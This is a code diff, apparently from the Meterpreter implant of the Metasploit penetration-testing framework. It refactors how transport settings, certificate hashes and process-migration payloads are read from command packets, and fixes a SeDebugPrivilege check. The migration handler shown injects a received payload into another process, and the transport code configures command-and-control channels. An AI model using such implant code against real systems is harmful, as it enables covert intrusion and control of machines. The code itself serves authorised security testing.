@@ -86,7 +86,8 @@ DWORD create_transport_from_request(Remote* remote, Packet* packet, Transport** 
 			wchar_t* proxy = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_HOST);
 			wchar_t* proxyUser = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_USER);
 			wchar_t* proxyPass = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_PASS);
-			PBYTE certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH);
+			DWORD certHashLen = 0;
+			PBYTE certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH, &certHashLen);
 			wchar_t* headers = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_HEADERS);
 
 			size_t configSize = sizeof(MetsrvTransportHttp);
@@ -400,7 +401,8 @@ DWORD remote_request_core_transport_setcerthash(Remote* remote, Packet* packet)
 			break;
 		}
 
-		unsigned char* certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH);
+		DWORD certHashLen = 0;
+		unsigned char* certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH, &certHashLen);
 		HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
 
 		// Support adding a new cert hash if one doesn't exist
@@ -540,20 +542,18 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 		// Get the target process architecture to inject into
 		dwDestinationArch = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_ARCH);
 
-		// Get the length of the payload buffer
-		dwPayloadLength = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_PAYLOAD_LEN);
-
 		// Receive the actual migration payload buffer
-		lpPayloadBuffer = packet_get_tlv_value_string(packet, TLV_TYPE_MIGRATE_PAYLOAD);
+		lpPayloadBuffer = packet_get_tlv_value_raw(packet, TLV_TYPE_MIGRATE_PAYLOAD, &dwPayloadLength);
 
 		// Get handles to the updated UUIDs if they're there
-		lpUuid = packet_get_tlv_value_raw(packet, TLV_TYPE_UUID);
+		DWORD uuidLen = 0;
+		lpUuid = packet_get_tlv_value_raw(packet, TLV_TYPE_UUID, &uuidLen);
 
 		// Get the migrate stub information
-		dwMigrateStubLength = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_STUB_LEN);
-		lpMigrateStub = packet_get_tlv_value_raw(packet, TLV_TYPE_MIGRATE_STUB);
+		lpMigrateStub = packet_get_tlv_value_raw(packet, TLV_TYPE_MIGRATE_STUB, &dwMigrateStubLength);
 
-		dprintf("[MIGRATE] Attempting to migrate. ProcessID=%d, Arch=%s, PayloadLength=%d", dwProcessID, (dwDestinationArch == 2 ? "x64" : "x86"), dwPayloadLength);
+		dprintf("[MIGRATE] Attempting to migrate. ProcessID=%d, Arch=%s", dwProcessID, dwDestinationArch == 2 ? "x64" : "x86");
+		dprintf("[MIGRATE] Attempting to migrate. PayloadLength=%d StubLength=%d", dwPayloadLength, dwMigrateStubLength);
 
 		// If we can, get SeDebugPrivilege...
 		if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
@@ -565,7 +565,7 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 
 			if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
 			{
-				if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL));
+				if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL))
 				{
 					dprintf("[MIGRATE] Got SeDebugPrivilege!");
 				}
@@ -788,17 +788,17 @@ DWORD remote_request_core_transport_set_timeouts(Remote * remote, Packet * packe
  *      The channel type to allocate.  If set, the function returns, allowing
  *      a further up extension handler to allocate the channel.
  */
-DWORD remote_request_core_channel_open(Remote *remote, Packet *packet)
+DWORD remote_request_core_channel_open(Remote* remote, Packet* packet)
 {
-	Packet *response;
+	Packet* response;
 	DWORD res = ERROR_SUCCESS;
-	Channel *newChannel;
+	Channel* newChannel;
 	PCHAR channelType;
 	DWORD flags = 0;
 
 	do
 	{
-		dprintf( "[CHANNEL] Opening new channel for packet %p", packet );
+		dprintf("[CHANNEL] Opening new channel for packet %p", packet);
 
 		// If the channel open request had a specific channel type
 		if ((channelType = packet_get_tlv_value_string(packet, TLV_TYPE_CHANNEL_TYPE)))
@@ -810,11 +810,11 @@ DWORD remote_request_core_channel_open(Remote *remote, Packet *packet)
 		// Get any flags that were supplied
 		flags = packet_get_tlv_value_uint(packet, TLV_TYPE_FLAGS);
 
-		dprintf( "[CHANNEL] Opening %s %u", channelType, flags );
+		dprintf("[CHANNEL] Opening %s %u", channelType, flags);
 
 		// Allocate a response
 		response = packet_create_response(packet);
-		
+
 		// Did the response allocation fail?
 		if ((!response) || (!(newChannel = channel_create(0, flags))))
 		{
@@ -822,23 +822,24 @@ DWORD remote_request_core_channel_open(Remote *remote, Packet *packet)
 			break;
 		}
 
-		dprintf( "[CHANNEL] Opened %s %u", channelType, flags );
+		dprintf("[CHANNEL] Opened %s %u", channelType, flags);
 
 		// Get the channel class and set it
 		newChannel->cls = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_CLASS);
 
-		dprintf( "[CHANNEL] Channel class for %s: %u", channelType, newChannel->cls );
+		dprintf("[CHANNEL] Channel class for %s: %u", channelType, newChannel->cls);
 
 		// Add the new channel identifier to the response
-		if ((res = packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID,
-				channel_get_id(newChannel))) != ERROR_SUCCESS)
+		if ((res = packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channel_get_id(newChannel))) != ERROR_SUCCESS)
+		{
 			break;
+		}
 
 		// Transmit the response
-		dprintf( "[CHANNEL] Sending response for %s", channelType  );
+		dprintf("[CHANNEL] Sending response for %s", channelType);
 		res = packet_transmit(remote, response, NULL);
 
-		dprintf( "[CHANNEL] Done" );
+		dprintf("[CHANNEL] Done");
 
 	} while (0);
 
@@ -1317,32 +1318,32 @@ DWORD remote_request_core_channel_tell(Remote *remote, Packet *packet)
  * req: TLV_TYPE_CHANNEL_ID -- The channel identifier to interact with
  * req: TLV_TYPE_BOOL       -- True if interactive, false if not.
  */
-DWORD remote_request_core_channel_interact(Remote *remote, Packet *packet)
+DWORD remote_request_core_channel_interact(Remote* remote, Packet* packet)
 {
-	Packet *response = packet_create_response(packet);
-	Channel *channel = NULL;
+	Packet* response = packet_create_response(packet);
+	Channel* channel = NULL;
 	DWORD channelId;
 	DWORD result = ERROR_SUCCESS;
 	BOOLEAN interact;
 
 	// Get the channel identifier
 	channelId = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID);
-	interact  = packet_get_tlv_value_bool(packet, TLV_TYPE_BOOL);
+	interact = packet_get_tlv_value_bool(packet, TLV_TYPE_BOOL);
 
 	// If the channel is found, set the interactive flag accordingly
 	if ((channel = channel_find_by_id(channelId)))
 	{
-		lock_acquire( channel->lock );
+		lock_acquire(channel->lock);
 
 		// If the response packet is valid
-		if ((response) &&
-		    (channel_get_class(channel) != CHANNEL_CLASS_BUFFERED))
+		if ((response) && (channel_get_class(channel) != CHANNEL_CLASS_BUFFERED))
 		{
-			NativeChannelOps *native = (NativeChannelOps *)&channel->ops;
+			NativeChannelOps* native = (NativeChannelOps*)&channel->ops;
 
 			// Check to see if this channel has a registered interact handler
-			dprintf( "[DISPATCH] attempting to set interactive: %d context 0x%p", interact, native->context );
-			if (native->interact) {
+			dprintf("[DISPATCH] attempting to set interactive: %d context 0x%p", interact, native->context);
+			if (native->interact)
+			{
 				result = native->interact(channel, packet, native->context, interact);
 			}
 		}
@@ -1350,7 +1351,7 @@ DWORD remote_request_core_channel_interact(Remote *remote, Packet *packet)
 		// Set the channel's interactive state
 		channel_set_interactive(channel, interact);
 
-		lock_release( channel->lock );
+		lock_release(channel->lock);
 	}
 
 	// Send the response to the requestor so that the interaction can be 
